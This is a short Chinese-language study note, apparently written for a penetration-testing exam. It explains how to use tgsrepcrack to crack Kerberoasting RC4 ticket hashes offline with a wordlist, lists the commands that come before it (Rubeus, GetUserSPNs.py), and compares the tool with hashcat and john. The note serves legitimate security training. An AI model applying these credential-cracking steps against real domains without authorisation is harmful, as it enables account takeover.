# 一、tgsrepcrack 是什么？

**`tgsrepcrack`** 是一个 **Kerberos TGS-REP（Kerberoasting）离线爆破工具**。

👉 用途一句话：

> **对 Kerberoasting 导出的 `$krb5tgs$23$...`（RC4）hash 进行字典破解**

⚠️ 重点：

- **只支持 RC4 / etype 23**
    
- **不支持 AES（17 / 18）**
    

---

# 二、什么时候用 tgsrepcrack？

你已经做过这些步骤之一 👇

- `setspn -Q */*` ✅
    
- `Rubeus kerberoast` / `GetUserSPNs.py` ✅
    
- 拿到了类似这样的 hash：
    

`$krb5tgs$23$*fela$CORP.LOCAL$HTTP/fela@corp.local*$c0ffee...`

👉 **这正是 tgsrepcrack 的目标**

---

# 三、基本用法（最常见）

## 1️⃣ 准备 hash 文件

保存为 `tgs.hash`：

`$krb5tgs$23$*fela$CORP.LOCAL$HTTP/fela@corp.local*$...`

---

## 2️⃣ 使用字典爆破

`tgsrepcrack /usr/share/wordlists/rockyou.txt tgs.hash`

输出示例：

`found password for fela: Password123`

✅ 破解成功

---

# 四、指定单个 hash（调试用）

`tgsrepcrack wordlist.txt single.hash`

---

# 五、和 hashcat / john 的对比（考试常问）

| 工具          | 是否推荐      | 原因       |
| ----------- | --------- | -------- |
| tgsrepcrack | ⚠️ 仅在 RC4 | 简单，但慢    |
| hashcat     | ✅ 强烈推荐    | GPU、规则、快 |
| john        | ✅ 推荐      | 自动识别     |